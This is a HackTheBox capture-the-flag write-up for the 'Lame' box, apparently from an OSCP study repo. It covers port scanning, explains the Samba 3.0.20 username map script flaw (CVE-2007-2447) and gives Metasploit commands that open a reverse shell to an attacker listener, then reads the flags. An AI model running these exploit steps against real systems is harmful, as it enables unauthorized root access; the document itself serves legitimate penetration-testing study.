# Lame | HackTheBox Writeup

**OS:** Linux | **Difficulty:** Easy | **Rooted:** 2026-04-30

**Techniques:** SMB enumeration, CVE-2007-2447 (Samba username map script RCE)

---

## Overview

Lame is an Easy Linux box that demonstrates a critical remote code execution vulnerability in Samba 3.0.20. The `username map script` option in smb.conf causes Samba to pass the authentication username field directly to `/bin/sh` without sanitizing shell metacharacters. Injecting a reverse shell payload through the username field during authentication yields an immediate root shell. No privilege escalation required.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 1000 -oN Lame-all-ports.txt 10.129.26.106
ports=$(grep open Lame-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p $ports -sC -sV --min-rate 1000 -oN Lame-service-scan.txt 10.129.26.106
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 139 | NetBIOS | Samba 3.X - 4.X |
| 445 | SMB | Samba 3.0.20-Debian |
| 3632 | distccd | distccd v1 (GNU 4.2.4) |

### FTP Anonymous Login

Anonymous access allowed but directory was empty. Ruled out and moved on.

### Samba Version

Nmap identified **Samba 3.0.20-Debian**, vulnerable to CVE-2007-2447.

---

## Exploitation

### CVE-2007-2447: Samba Username Map Script RCE

When `username map script` is enabled in smb.conf, Samba passes the SMB username to `/bin/sh` without sanitizing shell metacharacters. Injecting a reverse shell payload through the username field executes as root.

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.26.106
set LHOST 10.10.15.67
set LPORT 4444
run
```

Root shell obtained immediately. No privilege escalation step required.

---

## Flags

```bash
whoami
# root

find / -name user.txt 2>/dev/null | xargs cat
# d3fc3a5f85c2cfe6e498a05788584559

cat /root/root.txt
# 91870fd4b6ca4f14b6761551bc12cbe4
```

---

## Attack Chain

```
Nmap service scan
    -> Samba 3.0.20 identified
        -> CVE-2007-2447: username map script RCE
            -> Root shell (no privesc needed)
```

---

## Key Takeaways

- Service version numbers in nmap output determine the entire attack path. Look up every version before moving on.
- Samba running as root means RCE through the daemon lands you directly at the top. Always check whoami immediately on landing a shell.
- FTP anonymous access is worth a quick check but do not linger if the share is empty.
- distccd on 3632 is a valid alternative path via CVE-2004-2687. Knowing multiple routes matters when one vector fails.
- Shell metacharacter payloads through smbclient can fail due to escaping issues on ARM systems. Metasploit was the correct tool here.

---

## Screenshots

| Step | File |
|------|------|
| Nmap all ports | `screenshots/01-nmap-all-ports.png` |
| Nmap service scan | `screenshots/02-nmap-service-scan.png` |
| FTP anonymous login | `screenshots/03-ftp-anonymous-login.png` |
| Metasploit module config | `screenshots/04-msf-module-config.png` |
| Exploit run and session open | `screenshots/05-msf-usermap-script-exploit.png` |
| Root shell whoami | `screenshots/06-root-shell-whoami.png` |
| Root flag | `screenshots/07-root-flag.png` |
| User flag | `screenshots/08-user-flag.png` |

---

*Part of the [oscp-journey](https://github.com/mavhezha/oscp-journey) repo. TJ Null HTB list, Linux Phase L1.*
